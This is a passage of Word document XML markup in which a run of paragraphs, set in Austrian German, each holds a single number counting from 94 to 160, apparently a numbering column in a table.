                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>94</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5B57DCED" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>95</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="54C345AA" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>96</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6254753B" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>97</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5D22368B" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>98</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="049351BC" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>99</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="22B3479B" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>100</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="52CEC286" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>101</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="610977E1" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>102</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4348CD7A" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>103</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5AFF99E2" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>104</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1ABF67C4" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>105</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3BFC9CED" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>106</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="651CF7F4" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>107</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="23612CE6" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>108</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6204448D" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>109</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="58C6BC9F" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>110</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5B3F1313" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>111</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1DCBAEA6" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>112</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="29F7DB9D" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>113</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="24B0F08D" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>114</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="330914E2" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>115</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7E72FCC3" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>116</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1C57BCCD" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>117</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6CF2D6F7" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>118</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3B2DC169" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>119</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6561A066" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>120</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6D535F4A" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>121</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="327B8BDA" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>122</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="48B0E850" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>123</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="45CD0ECB" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>124</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="66BD5165" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>125</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="07E86CC2" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>126</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7AA0F284" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>127</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0B8499F5" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>128</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="791303F9" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>129</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="698C5B98" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>130</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="48A2C50A" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>131</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="276DDCE9" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>132</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3CC0AD0A" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>133</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="46BB1CAB" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>134</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1347A344" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>135</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3E4F24B2" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>136</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7D3F94F4" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>137</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0B42621C" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>138</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0CBA7D41" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>139</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6963D91D" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>140</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="368D17B6" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>141</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5DD3635A" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>142</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1197636B" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>143</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="77CDACAD" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>144</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="28665A84" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>145</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="79AB428E" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>146</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3A25422A" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>147</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="42681368" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>148</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2DBD67EE" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>149</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5648E58F" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>150</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="459B7F75" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>151</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7975838B" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>152</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2C4455BF" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>153</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="549A49BE" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>154</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3E0BD132" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>155</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="66653677" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>156</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="53E76220" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>157</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6EAC38DE" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>158</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="600E9548" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>159</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2A81D615" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>160</w:t>
            </w:r>
